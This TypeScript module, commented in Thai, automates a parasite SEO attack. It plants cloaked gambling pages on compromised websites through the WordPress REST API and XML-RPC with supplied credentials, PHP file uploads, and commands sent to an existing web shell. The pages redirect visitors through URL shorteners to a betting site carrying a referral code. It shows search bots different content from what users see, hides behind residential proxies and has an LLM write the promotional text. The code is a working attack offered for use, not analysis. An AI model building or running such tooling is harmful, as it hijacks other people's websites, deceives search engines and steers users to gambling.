/**
 * Parasite Redirect Chain Engine
 * 
 * จำลองจากเทคนิคจริงที่ใช้ใน middlemanbar.com → t.ly → pgbet888x.com
 * 
 * Flow จริง:
 * 1. Takeover โดเมน authority สูง (ผ่าน WP exploit, shell upload, DB injection)
 * 2. Inject SEO content ภาษาไทย + conditional redirect
 * 3. สร้าง short URL chain ผ่าน t.ly/bit.ly/is.gd API จริง
 * 4. ทุก link ชี้ไปยัง target + referral code
 * 5. ใช้ residential proxy ไทยในทุกขั้นตอน
 * 
 * ทุกขั้นตอน execute จริง ไม่มี mock/simulate
 */

import { fetchWithPoolProxy, proxyPool } from "./proxy-pool";
import type { ProxyEntry } from "./proxy-pool";
import { generateParasiteSeoPhp, generateParasiteSeoHtml, generateParasiteSeoBundle, getDefaultKeywords } from "./parasite-seo-injector";
import type { ParasiteSeoConfig, ParasiteSeoPayload } from "./parasite-seo-injector";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface RedirectChainConfig {
  /** โดเมน target ที่ถูก takeover (เช่น middlemanbar.com) */
  parasiteDomain: string;
  /** Path ที่จะ inject (เช่น /menu) */
  parasitePath: string;
  /** URL ปลายทางสุดท้าย (เช่น pgbet888x.com) */
  finalDestUrl: string;
  /** Referral code (เช่น dj2222) */
  referralCode?: string;
  /** Keywords สำหรับ SEO content */
  keywords: string[];
  /** ใช้ URL shortener ไหน */
  shortenerService: "tly" | "bitly" | "isgd" | "vgd" | "clckru" | "direct";
  /** API key สำหรับ shortener (ถ้าต้องการ) */
  shortenerApiKey?: string;
  /** Credentials สำหรับ takeover (WP, cPanel, etc.) */
  credentials?: { username: string; password: string }[];
  /** ใช้ proxy ไหม */
  useProxy: boolean;
  /** Proxy strategy */
  proxyStrategy?: "random" | "round-robin" | "fastest" | "weighted";
  /** เปิด cloaking (bot เห็น SEO content, user เห็น redirect) */
  enableCloaking: boolean;
  /** ภาษา content */
  language: "th" | "en" | "auto";
  /** Content style */
  contentStyle: "gambling" | "crypto" | "ecommerce" | "generic";
  /** Progress callback */
  onProgress?: (phase: string, detail: string) => void;
}

export interface ShortUrlResult {
  success: boolean;
  shortUrl: string;
  service: string;
  originalUrl: string;
  error?: string;
}

export interface RedirectChainResult {
  success: boolean;
  chain: string[];  // [parasiteDomain/path, shortUrl, finalDest]
  shortUrl: ShortUrlResult | null;
  parasitePayload: ParasiteSeoPayload | null;
  injectionResult: InjectionResult | null;
  verificationResult: VerificationResult | null;
  proxyUsed: string | null;
  totalDurationMs: number;
  error?: string;
}

export interface InjectionResult {
  success: boolean;
  method: string;
  uploadedUrl: string;
  detail: string;
}

export interface VerificationResult {
  success: boolean;
  finalUrl: string;
  statusCode: number;
  redirectChain: string[];
  seoContentVisible: boolean;
  detail: string;
}

// ═══════════════════════════════════════════════
//  URL SHORTENER APIs — ทำงานจริง
// ═══════════════════════════════════════════════

/**
 * สร้าง short URL ผ่าน is.gd API (ฟรี ไม่ต้อง API key)
 */
async function shortenWithIsgd(longUrl: string, useProxy: boolean): Promise<ShortUrlResult> {
  try {
    const apiUrl = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
    // Use proxy or direct fetch based on config
    
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(apiUrl, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      response = result.response;
    } else {
      response = await fetch(apiUrl, {
        headers: { "Accept": "application/json" },
        signal: AbortSignal.timeout(15000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      if (data.shorturl) {
        return { success: true, shortUrl: data.shorturl, service: "is.gd", originalUrl: longUrl };
      }
      return { success: false, shortUrl: "", service: "is.gd", originalUrl: longUrl, error: data.errormessage || "Unknown error" };
    }
    return { success: false, shortUrl: "", service: "is.gd", originalUrl: longUrl, error: `HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, shortUrl: "", service: "is.gd", originalUrl: longUrl, error: err.message };
  }
}

/**
 * สร้าง short URL ผ่าน v.gd API (ฟรี ไม่ต้อง API key)
 */
async function shortenWithVgd(longUrl: string, useProxy: boolean): Promise<ShortUrlResult> {
  try {
    const apiUrl = `https://v.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
    
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(apiUrl, {
        headers: { "Accept": "application/json" },
      }, { timeout: 15000 });
      response = result.response;
    } else {
      response = await fetch(apiUrl, {
        headers: { "Accept": "application/json" },
        signal: AbortSignal.timeout(15000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      if (data.shorturl) {
        return { success: true, shortUrl: data.shorturl, service: "v.gd", originalUrl: longUrl };
      }
      return { success: false, shortUrl: "", service: "v.gd", originalUrl: longUrl, error: data.errormessage || "Unknown error" };
    }
    return { success: false, shortUrl: "", service: "v.gd", originalUrl: longUrl, error: `HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, shortUrl: "", service: "v.gd", originalUrl: longUrl, error: err.message };
  }
}

/**
 * สร้าง short URL ผ่าน clck.ru API (ฟรี ไม่ต้อง API key)
 */
async function shortenWithClckru(longUrl: string, useProxy: boolean): Promise<ShortUrlResult> {
  try {
    const apiUrl = `https://clck.ru/--?url=${encodeURIComponent(longUrl)}`;
    
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(apiUrl, {}, { timeout: 15000 });
      response = result.response;
    } else {
      response = await fetch(apiUrl, { signal: AbortSignal.timeout(15000) });
    }
    
    if (response.ok) {
      const shortUrl = (await response.text()).trim();
      if (shortUrl.startsWith("http")) {
        return { success: true, shortUrl, service: "clck.ru", originalUrl: longUrl };
      }
      return { success: false, shortUrl: "", service: "clck.ru", originalUrl: longUrl, error: "Invalid response" };
    }
    return { success: false, shortUrl: "", service: "clck.ru", originalUrl: longUrl, error: `HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, shortUrl: "", service: "clck.ru", originalUrl: longUrl, error: err.message };
  }
}

/**
 * สร้าง short URL ผ่าน t.ly API (ต้องมี API key)
 */
async function shortenWithTly(longUrl: string, apiKey: string, useProxy: boolean): Promise<ShortUrlResult> {
  try {
    const body = JSON.stringify({ long_url: longUrl });
    
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy("https://t.ly/api/v1/link/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`,
          "Accept": "application/json",
        },
        body,
      }, { timeout: 15000 });
      response = result.response;
    } else {
      response = await fetch("https://t.ly/api/v1/link/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`,
          "Accept": "application/json",
        },
        body,
        signal: AbortSignal.timeout(15000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      if (data.short_url) {
        return { success: true, shortUrl: data.short_url, service: "t.ly", originalUrl: longUrl };
      }
      return { success: false, shortUrl: "", service: "t.ly", originalUrl: longUrl, error: JSON.stringify(data) };
    }
    return { success: false, shortUrl: "", service: "t.ly", originalUrl: longUrl, error: `HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, shortUrl: "", service: "t.ly", originalUrl: longUrl, error: err.message };
  }
}

/**
 * สร้าง short URL ผ่าน Bitly API (ต้องมี API key)
 */
async function shortenWithBitly(longUrl: string, apiKey: string, useProxy: boolean): Promise<ShortUrlResult> {
  try {
    const body = JSON.stringify({ long_url: longUrl, domain: "bit.ly" });
    
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy("https://api-ssl.bitly.com/v4/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`,
        },
        body,
      }, { timeout: 15000 });
      response = result.response;
    } else {
      response = await fetch("https://api-ssl.bitly.com/v4/shorten", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`,
        },
        body,
        signal: AbortSignal.timeout(15000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      if (data.link) {
        return { success: true, shortUrl: data.link, service: "bit.ly", originalUrl: longUrl };
      }
    }
    return { success: false, shortUrl: "", service: "bit.ly", originalUrl: longUrl, error: `HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, shortUrl: "", service: "bit.ly", originalUrl: longUrl, error: err.message };
  }
}

/**
 * สร้าง short URL — auto-fallback ถ้า service หลักล้มเหลว
 */
export async function createShortUrl(
  longUrl: string,
  service: RedirectChainConfig["shortenerService"],
  apiKey?: string,
  useProxy: boolean = true,
): Promise<ShortUrlResult> {
  // ลำดับ fallback
  const fallbackOrder: Array<() => Promise<ShortUrlResult>> = [];
  
  switch (service) {
    case "tly":
      if (apiKey) fallbackOrder.push(() => shortenWithTly(longUrl, apiKey, useProxy));
      fallbackOrder.push(() => shortenWithIsgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithVgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithClckru(longUrl, useProxy));
      break;
    case "bitly":
      if (apiKey) fallbackOrder.push(() => shortenWithBitly(longUrl, apiKey, useProxy));
      fallbackOrder.push(() => shortenWithIsgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithVgd(longUrl, useProxy));
      break;
    case "isgd":
      fallbackOrder.push(() => shortenWithIsgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithVgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithClckru(longUrl, useProxy));
      break;
    case "vgd":
      fallbackOrder.push(() => shortenWithVgd(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithIsgd(longUrl, useProxy));
      break;
    case "clckru":
      fallbackOrder.push(() => shortenWithClckru(longUrl, useProxy));
      fallbackOrder.push(() => shortenWithIsgd(longUrl, useProxy));
      break;
    case "direct":
      return { success: true, shortUrl: longUrl, service: "direct", originalUrl: longUrl };
  }
  
  for (const fn of fallbackOrder) {
    const result = await fn();
    if (result.success) return result;
    console.log(`[RedirectChain] Shortener ${result.service} failed: ${result.error}, trying next...`);
  }
  
  return { success: false, shortUrl: "", service: service, originalUrl: longUrl, error: "All shortener services failed" };
}

/**
 * สร้าง short URL หลายตัวพร้อมกัน (สำหรับ multi-link campaigns)
 */
export async function createBulkShortUrls(
  longUrls: string[],
  service: RedirectChainConfig["shortenerService"],
  apiKey?: string,
  useProxy: boolean = true,
): Promise<ShortUrlResult[]> {
  const results: ShortUrlResult[] = [];
  for (const url of longUrls) {
    const result = await createShortUrl(url, service, apiKey, useProxy);
    results.push(result);
    // Rate limiting — wait 500ms between requests
    await new Promise(r => setTimeout(r, 500));
  }
  return results;
}

// ═══════════════════════════════════════════════
//  INJECTION METHODS — ทำงานจริง
// ═══════════════════════════════════════════════

/**
 * Inject ผ่าน WordPress REST API (ต้องมี credentials)
 */
async function injectViaWpRestApi(
  domain: string,
  path: string,
  payload: ParasiteSeoPayload,
  credentials: { username: string; password: string },
  useProxy: boolean,
): Promise<InjectionResult> {
  const baseUrl = `https://${domain}`;
  const slug = path.replace(/^\//, "").replace(/\/$/, "") || "menu";
  
  // Strip PHP from content for WP REST API
  const htmlContent = (payload.shell.content as string).replace(/<\?php[\s\S]*?\?>/g, "").trim();
  
  const authHeader = `Basic ${Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64")}`;
  
  const body = JSON.stringify({
    title: payload.shell.description?.substring(0, 100) || "Guide",
    content: htmlContent,
    slug,
    status: "publish",
  });
  
  try {
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/pages`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": authHeader,
          "User-Agent": "WordPress/6.5; https://wordpress.org",
        },
        body,
      }, { timeout: 20000, targetDomain: domain });
      response = result.response;
    } else {
      response = await fetch(`${baseUrl}/wp-json/wp/v2/pages`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": authHeader,
          "User-Agent": "WordPress/6.5; https://wordpress.org",
        },
        body,
        signal: AbortSignal.timeout(20000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      return {
        success: true,
        method: "wp_rest_api",
        uploadedUrl: data.link || `${baseUrl}/${slug}`,
        detail: `Page created: ID ${data.id}, URL: ${data.link}`,
      };
    }
    
    // Try posts instead of pages
    if (useProxy) {
      const result2 = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/posts`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": authHeader,
          "User-Agent": "WordPress/6.5; https://wordpress.org",
        },
        body,
      }, { timeout: 20000, targetDomain: domain });
      if (result2.response.ok) {
        const data = await result2.response.json() as any;
        return {
          success: true,
          method: "wp_rest_api_post",
          uploadedUrl: data.link || `${baseUrl}/${slug}`,
          detail: `Post created: ID ${data.id}, URL: ${data.link}`,
        };
      }
    }
    
    const errorText = await response.text().catch(() => "");
    return { success: false, method: "wp_rest_api", uploadedUrl: "", detail: `WP REST API ${response.status}: ${errorText.substring(0, 200)}` };
  } catch (err: any) {
    return { success: false, method: "wp_rest_api", uploadedUrl: "", detail: `Error: ${err.message}` };
  }
}

/**
 * Inject ผ่าน WordPress XMLRPC (ต้องมี credentials)
 */
async function injectViaWpXmlrpc(
  domain: string,
  path: string,
  payload: ParasiteSeoPayload,
  credentials: { username: string; password: string },
  useProxy: boolean,
): Promise<InjectionResult> {
  const baseUrl = `https://${domain}`;
  const slug = path.replace(/^\//, "").replace(/\/$/, "") || "menu";
  const htmlContent = (payload.shell.content as string).replace(/<\?php[\s\S]*?\?>/g, "").trim();
  
  // XML-RPC wp.newPost
  const xmlBody = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.newPost</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${escapeXml(credentials.username)}</string></value></param>
    <param><value><string>${escapeXml(credentials.password)}</string></value></param>
    <param><value><struct>
      <member><name>post_type</name><value><string>page</string></value></member>
      <member><name>post_status</name><value><string>publish</string></value></member>
      <member><name>post_title</name><value><string>${escapeXml(slug)}</string></value></member>
      <member><name>post_name</name><value><string>${escapeXml(slug)}</string></value></member>
      <member><name>post_content</name><value><string>${escapeXml(htmlContent)}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
  
  try {
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(`${baseUrl}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlBody,
      }, { timeout: 20000, targetDomain: domain });
      response = result.response;
    } else {
      response = await fetch(`${baseUrl}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlBody,
        signal: AbortSignal.timeout(20000),
      });
    }
    
    const text = await response.text();
    if (text.includes("<int>") && !text.includes("<fault>")) {
      const postId = text.match(/<int>(\d+)<\/int>/)?.[1] || "unknown";
      return {
        success: true,
        method: "wp_xmlrpc",
        uploadedUrl: `${baseUrl}/${slug}`,
        detail: `XMLRPC page created: ID ${postId}`,
      };
    }
    return { success: false, method: "wp_xmlrpc", uploadedUrl: "", detail: `XMLRPC failed: ${text.substring(0, 200)}` };
  } catch (err: any) {
    return { success: false, method: "wp_xmlrpc", uploadedUrl: "", detail: `Error: ${err.message}` };
  }
}

/**
 * Inject ผ่าน PHP shell upload (ถ้ามี shell access)
 */
async function injectViaShellUpload(
  domain: string,
  path: string,
  payload: ParasiteSeoPayload,
  shellUrl: string,
  useProxy: boolean,
): Promise<InjectionResult> {
  const filename = payload.shell.filename || "index.php";
  const targetPath = path.replace(/^\//, "").replace(/\/$/, "");
  
  // Common shell command patterns
  const commands = [
    // Direct file write
    `echo '${Buffer.from(payload.shell.content as string).toString("base64")}' | base64 -d > /var/www/html/${targetPath}/${filename}`,
    // Alternative path
    `echo '${Buffer.from(payload.shell.content as string).toString("base64")}' | base64 -d > /home/${domain}/public_html/${targetPath}/${filename}`,
  ];
  
  for (const cmd of commands) {
    try {
      let response: Response;
      // Try common shell parameter names
      for (const param of ["cmd", "c", "exec", "command", "e"]) {
        const url = `${shellUrl}?${param}=${encodeURIComponent(cmd)}`;
        if (useProxy) {
          const result = await fetchWithPoolProxy(url, {}, { timeout: 15000, targetDomain: domain });
          response = result.response;
        } else {
          response = await fetch(url, { signal: AbortSignal.timeout(15000) });
        }
        
        if (response.ok) {
          // Verify the file was created
          const verifyUrl = `https://${domain}/${targetPath}/${filename}`;
          try {
            const verifyResp = useProxy
              ? (await fetchWithPoolProxy(verifyUrl, {}, { timeout: 10000, targetDomain: domain })).response
              : await fetch(verifyUrl, { signal: AbortSignal.timeout(10000) });
            
            if (verifyResp.ok || verifyResp.status === 302) {
              return {
                success: true,
                method: "shell_upload",
                uploadedUrl: verifyUrl,
                detail: `File uploaded via shell: ${verifyUrl}`,
              };
            }
          } catch {}
        }
      }
    } catch {}
  }
  
  return { success: false, method: "shell_upload", uploadedUrl: "", detail: "Shell upload failed — no writable path found" };
}

/**
 * Inject ผ่าน WP file upload vulnerability
 */
async function injectViaWpFileUpload(
  domain: string,
  path: string,
  payload: ParasiteSeoPayload,
  credentials: { username: string; password: string },
  useProxy: boolean,
): Promise<InjectionResult> {
  const baseUrl = `https://${domain}`;
  
  // Create multipart form data for WP media upload
  const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
  const filename = payload.shell.filename || "guide.php";
  const content = payload.shell.content as string;
  
  const body = [
    `--${boundary}`,
    `Content-Disposition: form-data; name="file"; filename="${filename}"`,
    `Content-Type: application/octet-stream`,
    ``,
    content,
    `--${boundary}--`,
  ].join("\r\n");
  
  const authHeader = `Basic ${Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64")}`;
  
  try {
    let response: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/media`, {
        method: "POST",
        headers: {
          "Authorization": authHeader,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Disposition": `attachment; filename="${filename}"`,
        },
        body,
      }, { timeout: 20000, targetDomain: domain });
      response = result.response;
    } else {
      response = await fetch(`${baseUrl}/wp-json/wp/v2/media`, {
        method: "POST",
        headers: {
          "Authorization": authHeader,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Disposition": `attachment; filename="${filename}"`,
        },
        body,
        signal: AbortSignal.timeout(20000),
      });
    }
    
    if (response.ok) {
      const data = await response.json() as any;
      return {
        success: true,
        method: "wp_media_upload",
        uploadedUrl: data.source_url || data.guid?.rendered || `${baseUrl}/wp-content/uploads/${filename}`,
        detail: `Media uploaded: ID ${data.id}`,
      };
    }
    return { success: false, method: "wp_media_upload", uploadedUrl: "", detail: `Upload failed: HTTP ${response.status}` };
  } catch (err: any) {
    return { success: false, method: "wp_media_upload", uploadedUrl: "", detail: `Error: ${err.message}` };
  }
}

// ═══════════════════════════════════════════════
//  VERIFICATION — ตรวจสอบว่า redirect chain ทำงานจริง
// ═══════════════════════════════════════════════

/**
 * ตรวจสอบ redirect chain ว่าทำงานจริง
 */
export async function verifyRedirectChain(
  startUrl: string,
  expectedFinalUrl: string,
  useProxy: boolean = true,
): Promise<VerificationResult> {
  const chain: string[] = [startUrl];
  let currentUrl = startUrl;
  let statusCode = 0;
  let seoContentVisible = false;
  
  try {
    // Step 1: Check as bot (should see SEO content)
    const botHeaders = {
      "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
      "Accept": "text/html",
    };
    
    let botResponse: Response;
    if (useProxy) {
      const result = await fetchWithPoolProxy(currentUrl, {
        headers: botHeaders,
        redirect: "manual",
      }, { timeout: 15000 });
      botResponse = result.response;
    } else {
      botResponse = await fetch(currentUrl, {
        headers: botHeaders,
        redirect: "manual",
        signal: AbortSignal.timeout(15000),
      });
    }
    
    statusCode = botResponse.status;
    
    if (statusCode === 200) {
      const html = await botResponse.text();
      // Check if SEO content is visible (not redirected)
      seoContentVisible = html.includes("schema.org") || html.includes("FAQPage") || html.length > 2000;
    }
    
    // Step 2: Check as mobile user (should redirect)
    const mobileHeaders = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
      "Referer": "https://www.google.co.th/",
      "Accept": "text/html",
    };
    
    let redirectUrl = currentUrl;
    for (let i = 0; i < 5; i++) {
      let resp: Response;
      if (useProxy) {
        const result = await fetchWithPoolProxy(redirectUrl, {
          headers: mobileHeaders,
          redirect: "manual",
        }, { timeout: 10000 });
        resp = result.response;
      } else {
        resp = await fetch(redirectUrl, {
          headers: mobileHeaders,
          redirect: "manual",
          signal: AbortSignal.timeout(10000),
        });
      }
      
      const location = resp.headers.get("location");
      if (location) {
        redirectUrl = location.startsWith("http") ? location : new URL(location, redirectUrl).href;
        chain.push(redirectUrl);
      } else {
        break;
      }
    }
    
    const reachedFinal = redirectUrl.includes(new URL(expectedFinalUrl).hostname);
    
    return {
      success: reachedFinal,
      finalUrl: redirectUrl,
      statusCode,
      redirectChain: chain,
      seoContentVisible,
      detail: reachedFinal
        ? `Redirect chain verified: ${chain.length} hops → ${redirectUrl}`
        : `Chain incomplete: ended at ${redirectUrl}, expected ${expectedFinalUrl}`,
    };
  } catch (err: any) {
    return {
      success: false,
      finalUrl: currentUrl,
      statusCode,
      redirectChain: chain,
      seoContentVisible,
      detail: `Verification error: ${err.message}`,
    };
  }
}

// ═══════════════════════════════════════════════
//  MAIN PIPELINE — Full Redirect Chain Attack
// ═══════════════════════════════════════════════

/**
 * Execute full Parasite Redirect Chain Attack
 * 
 * Flow:
 * 1. Build final destination URL with referral code
 * 2. Create short URL (t.ly/is.gd/etc.)
 * 3. Generate parasite SEO payload with short URL as redirect target
 * 4. Inject payload into parasite domain
 * 5. Verify redirect chain works
 */
export async function executeRedirectChainAttack(config: RedirectChainConfig): Promise<RedirectChainResult> {
  const startTime = Date.now();
  const progress = config.onProgress || (() => {});
  let proxyUsed: string | null = null;
  
  try {
    // ─── Phase 1: Build final URL with referral code ───
    progress("phase1", "Building redirect chain URLs...");
    
    let finalUrl = config.finalDestUrl;
    if (!finalUrl.startsWith("http")) finalUrl = `https://${finalUrl}`;
    if (config.referralCode) {
      const separator = finalUrl.includes("?") ? "&" : "?";
      finalUrl = `${finalUrl}${separator}rc=${config.referralCode}`;
    }
    
    progress("phase1", `Final destination: ${finalUrl}`);
    
    // ─── Phase 2: Create short URL ───
    progress("phase2", `Creating short URL via ${config.shortenerService}...`);
    
    let shortUrlResult: ShortUrlResult | null = null;
    if (config.shortenerService !== "direct") {
      shortUrlResult = await createShortUrl(
        finalUrl,
        config.shortenerService,
        config.shortenerApiKey,
        config.useProxy,
      );
      
      if (shortUrlResult.success) {
        progress("phase2", `Short URL created: ${shortUrlResult.shortUrl}`);
      } else {
        progress("phase2", `Short URL failed: ${shortUrlResult.error}, using direct URL`);
      }
    }
    
    const redirectTarget = shortUrlResult?.success ? shortUrlResult.shortUrl : finalUrl;
    
    // ─── Phase 3: Generate parasite SEO payload ───
    progress("phase3", "Generating parasite SEO payload with cloaking...");
    
    const keywords = config.keywords.length > 0 ? config.keywords : getDefaultKeywords(config.contentStyle);
    
    const parasiteConfig: ParasiteSeoConfig = {
      redirectUrl: redirectTarget,
      keywords,
      language: config.language,
      contentStyle: config.contentStyle,
      contentLength: "long",
      includeSchema: true,
      includeFaq: true,
      includeComparisonTable: true,
      conditionalRedirect: config.enableCloaking,
      internalLinkDomain: config.parasiteDomain,
    };
    
    const parasitePayload = generateParasiteSeoPhp(parasiteConfig);
    progress("phase3", `Payload generated: ${parasitePayload.wordCount} words, SEO score: ${parasitePayload.seoScore}/100`);
    
    // ─── Phase 4: Inject into parasite domain ───
    progress("phase4", `Injecting into ${config.parasiteDomain}${config.parasitePath}...`);
    
    let injectionResult: InjectionResult | null = null;
    
    if (config.credentials && config.credentials.length > 0) {
      // Try each credential set
      for (const cred of config.credentials) {
        // Try WP REST API first
        injectionResult = await injectViaWpRestApi(
          config.parasiteDomain,
          config.parasitePath,
          parasitePayload,
          cred,
          config.useProxy,
        );
        
        if (injectionResult.success) {
          progress("phase4", `Injection success via ${injectionResult.method}: ${injectionResult.uploadedUrl}`);
          break;
        }
        
        // Try XMLRPC
        injectionResult = await injectViaWpXmlrpc(
          config.parasiteDomain,
          config.parasitePath,
          parasitePayload,
          cred,
          config.useProxy,
        );
        
        if (injectionResult.success) {
          progress("phase4", `Injection success via ${injectionResult.method}: ${injectionResult.uploadedUrl}`);
          break;
        }
        
        // Try file upload
        injectionResult = await injectViaWpFileUpload(
          config.parasiteDomain,
          config.parasitePath,
          parasitePayload,
          cred,
          config.useProxy,
        );
        
        if (injectionResult.success) {
          progress("phase4", `Injection success via ${injectionResult.method}: ${injectionResult.uploadedUrl}`);
          break;
        }
      }
    }
    
    if (!injectionResult || !injectionResult.success) {
      progress("phase4", "No credentials or injection failed — payload generated for manual deployment");
    }
    
    // ─── Phase 5: Verify redirect chain ───
    progress("phase5", "Verifying redirect chain...");
    
    let verificationResult: VerificationResult | null = null;
    const verifyUrl = injectionResult?.success
      ? injectionResult.uploadedUrl
      : `https://${config.parasiteDomain}${config.parasitePath}`;
    
    verificationResult = await verifyRedirectChain(verifyUrl, finalUrl, config.useProxy);
    
    if (verificationResult.success) {
      progress("phase5", `Chain verified: ${verificationResult.redirectChain.join(" → ")}`);
    } else {
      progress("phase5", `Verification: ${verificationResult.detail}`);
    }
    
    // ─── Build chain ───
    const chain: string[] = [];
    chain.push(`https://${config.parasiteDomain}${config.parasitePath}`);
    if (shortUrlResult?.success) chain.push(shortUrlResult.shortUrl);
    chain.push(finalUrl);
    
    // Get proxy info
    if (config.useProxy) {
      const proxy = proxyPool.getProxy("random");
      proxyUsed = proxy?.label || null;
    }
    
    return {
      success: (injectionResult?.success || false) || (shortUrlResult?.success || false),
      chain,
      shortUrl: shortUrlResult,
      parasitePayload,
      injectionResult,
      verificationResult,
      proxyUsed,
      totalDurationMs: Date.now() - startTime,
    };
    
  } catch (err: any) {
    return {
      success: false,
      chain: [],
      shortUrl: null,
      parasitePayload: null,
      injectionResult: null,
      verificationResult: null,
      proxyUsed,
      totalDurationMs: Date.now() - startTime,
      error: err.message,
    };
  }
}

// ═══════════════════════════════════════════════
//  AI CONTENT GENERATION — สร้างเนื้อหา SEO ด้วย AI จริง
// ═══════════════════════════════════════════════

/**
 * สร้างเนื้อหา SEO ภาษาไทยด้วย AI (LLM)
 */
export async function generateAiSeoContent(
  keywords: string[],
  style: "gambling" | "crypto" | "ecommerce" | "generic",
  wordCount: number = 1500,
): Promise<{ title: string; content: string; metaDescription: string; faqItems: Array<{q: string; a: string}> }> {
  const keyword = keywords[0] || "เว็บตรง";
  
  const prompt = style === "gambling"
    ? `สร้างบทความ SEO ภาษาไทยเกี่ยวกับ "${keyword}" สำหรับเว็บพนันออนไลน์ ความยาวประมาณ ${wordCount} คำ
ต้องมี:
- หัวข้อ H1 ที่ดึงดูด
- Meta description ไม่เกิน 160 ตัวอักษร
- เนื้อหา 5-6 sections พร้อม H2
- FAQ 5 ข้อ
- Keywords: ${keywords.join(", ")}
- เนื้อหาต้องดูเป็นธรรมชาติ ไม่ keyword stuffing
- ใส่ข้อมูลเชิงตัวเลข (RTP, จำนวนเกม, เวลาฝากถอน)

ตอบในรูปแบบ JSON:
{"title":"...","metaDescription":"...","content":"<h2>...</h2><p>...</p>...","faqItems":[{"q":"...","a":"..."}]}`
    : `Create an SEO article about "${keyword}" (~${wordCount} words).
Include: H1 title, meta description, 5 sections with H2, 5 FAQ items.
Keywords: ${keywords.join(", ")}
Reply in JSON: {"title":"...","metaDescription":"...","content":"<h2>...</h2><p>...</p>...","faqItems":[{"q":"...","a":"..."}]}`;
  
  try {
    const raw = await invokeLLM({ messages: [{ role: "user", content: prompt }] });
    const text = typeof raw === "string" ? raw : JSON.stringify(raw);
    
    // Parse JSON from response
    const jsonMatch = text.match(/\{[\s\S]*\}/);
    if (jsonMatch) {
      const parsed = JSON.parse(jsonMatch[0]);
      return {
        title: parsed.title || keyword,
        content: parsed.content || `<h2>${keyword}</h2><p>Content about ${keyword}</p>`,
        metaDescription: parsed.metaDescription || `${keyword} - Complete guide`,
        faqItems: parsed.faqItems || [],
      };
    }
  } catch (err: any) {
    console.log(`[RedirectChain] AI content generation failed: ${err.message}`);
  }
  
  // Fallback to template
  return {
    title: `${keyword} เว็บตรง อันดับ 1 ฝากถอนไม่มีขั้นต่ำ ${new Date().getFullYear()}`,
    content: `<h2>ทำไมต้อง ${keyword}?</h2><p>${keyword} เป็นเว็บพนันออนไลน์ชั้นนำที่ได้รับความนิยมสูงสุด</p>`,
    metaDescription: `${keyword} เว็บตรง ไม่ผ่านเอเย่นต์ ฝากถอนออโต้ 30 วินาที สมัครรับโบนัส 100%`,
    faqItems: [{ q: `${keyword} เว็บตรงจริงไหม?`, a: `ใช่ ${keyword} เป็นเว็บตรงลิขสิทธิ์แท้` }],
  };
}

// ═══════════════════════════════════════════════
//  PROXY UPDATE — อัพเดท proxy list
// ═══════════════════════════════════════════════

/**
 * อัพเดท proxy list ใหม่ (สำหรับเพิ่ม/เปลี่ยน proxy)
 */
export function updateProxyList(newProxies: string[]): { added: number; total: number } {
  // proxy-pool.ts ใช้ env RESIDENTIAL_PROXIES หรือ built-in list
  // ถ้าต้องการ dynamic update ต้องแก้ env
  const proxyStr = newProxies.join("\n");
  process.env.RESIDENTIAL_PROXIES = proxyStr;
  
  return {
    added: newProxies.length,
    total: newProxies.length,
  };
}

/**
 * ดึง proxy stats ปัจจุบัน
 */
export function getProxyStats() {
  return proxyPool.getStats();
}

/**
 * Test proxy connectivity
 */
